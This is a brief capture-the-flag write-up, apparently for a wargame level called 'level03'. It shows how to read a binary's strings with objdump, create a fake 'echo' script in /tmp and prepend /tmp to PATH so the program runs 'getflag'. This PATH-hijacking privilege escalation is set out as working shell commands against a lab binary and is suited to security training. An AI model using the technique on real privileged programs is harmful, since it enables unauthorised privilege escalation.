
There is a binary file named `level03` in the home directory; execute the following command: 

``` shell
objdump -s -j .rodata ./level03
```

From the output we can see that it calls `/usr/bin/env echo Exploit me`, so lets change the echo command to call `getflag` instead, for doing so create an file named `echo` that calls `getflag` instead:

``` shell
echo "getflag" > /tmp/echo
```

Change permissions of the dummy echo and run the program with the `PATH` changed so our echo is called first than the system one:

``` shell
chmod 777 /tmp/echo && PATH=/tmp:$PATH ./level03 
```

